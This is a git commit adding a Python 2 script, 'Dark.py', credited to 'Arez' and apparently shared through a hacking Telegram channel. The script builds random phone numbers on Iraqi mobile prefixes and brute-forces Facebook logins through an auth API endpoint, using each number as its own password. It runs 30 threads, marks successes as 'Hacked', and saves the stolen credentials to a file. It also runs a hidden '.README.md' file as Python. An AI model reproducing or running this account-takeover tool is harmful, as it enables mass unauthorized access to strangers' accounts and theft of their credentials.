f5182929ac06d90e52422947d37187f179b34d08
4REZ <78239316+4REZ@users.noreply.github.com>
2021-04-20 17:45:44 +0300

    Add files via upload

---
+++ Dark.py
@@ -0,0 +1,166 @@
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+for n in range(100000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(1)
+    os.system('python2 nmbr.py')
+
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def exb():
+    print '[!] Exit'
+    os.sys.exit()
+
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+def t():
+    time.sleep(1)
+
+
+def cb():
+    os.system('clear')
+
+
+logo = logo ="""
+
+\033[1;91m     DDD      A     RRRR  K  K
+\033[1;91m    D  D    A A    R  R  K K
+\033[1;91m   D  D   A   A   RRR   KK
+\033[1;91m  D D   AAAAAAA  R R   K K
+\033[1;91m DD   A       A R  R  K  K
+\033[1;94m Created By Arez
+\033[1;94m My Chenall Telegram IS @Home4Hack
+\033[1;94m My User Name @ravo_m \n
+\033[1;94m For Network (Korek , Tplink , Asia ,)
+"""
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+
+def menu():
+    os.system('clear')
+    print logo
+    print 42 * '\x1b[1;91m='
+    print '\x1b[1;94m[1] Random\x1B[1;31m Very Fast , Korek'
+    print '\x1b[1;94m[2] Random\x1b[1;32m Medium , tplink and Asia '
+    print '\x1b[1;94m[3] Random\x1b[1;33m Mod , all newtwork'
+
+    print 42 * '\x1b[1;91m='
+    action()
+
+
+def action():
+    global cpb
+    global oks
+    bch = raw_input('\n\x1b[1;91mHalbzhera Gullm ')
+    if bch == '':
+        print '[!] Fill in correctly'
+        action()
+    elif bch == '1':
+        os.system('clear')
+        print logo
+        print '\x1b[1;99m 770 - 771 - 772 \n 750 - 751 - 752 \n 780 - 781 - 782'
+        try:
+            c = raw_input(' Zhmarayak Dabne:) ')
+            k = ''
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+    elif bch == '2':
+        os.system('clear')
+        print('\x1b[1;94m Chawareka')
+        print(50*"-")
+        time.sleep(1)
+        os.system("python2 01.py")
+
+    elif bch == '3':
+        os.system('clear')
+        print('\x1b[1;94m Chawareka')
+        print(50*"-")
+        time.sleep(1)
+        os.system("python2 00.py")
+
+
+
+    elif bch == '0':
+        exb()
+    else:
+        print '[!] Fill Ba Kalk Naya'
+        action()
+    xxx = str(len(id))
+    psb('[\xe2\x9c\x93] Hamw Raqamakan: ' + xxx)
+    time.sleep(0.1)
+    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m Tkaya Chawarwan Ba ...')
+    time.sleep(0.1)
+    psb('[!] Bo Wastan Dni Toolaka CTRL+Z')
+    time.sleep(0.5)
+    psb('[!] Chawareka Ta 10 daqa')
+    time.sleep(0.5)
+    print 42 * '\x1b[1;91m='
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;91m[Hacked]\x1b[1;91m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+
+
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 42 * '\x1b[1;91m='
+    print '[\xe2\x9c\x93]\x1b[1;93m Tawaw Gula bax xeri le bbene;) ....'
+    print '[\xe2\x9c\x93]\x1b[1;92m Total OK/\x1b[1;96mCP : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x93]\x1b[1;91m Hacked Saved : save/successfull.txt'
+    raw_input('\n[Press Enter To Go Back]')
+    os.system('python2 .README.md')
+if __name__ == '__main__':
+    menu()
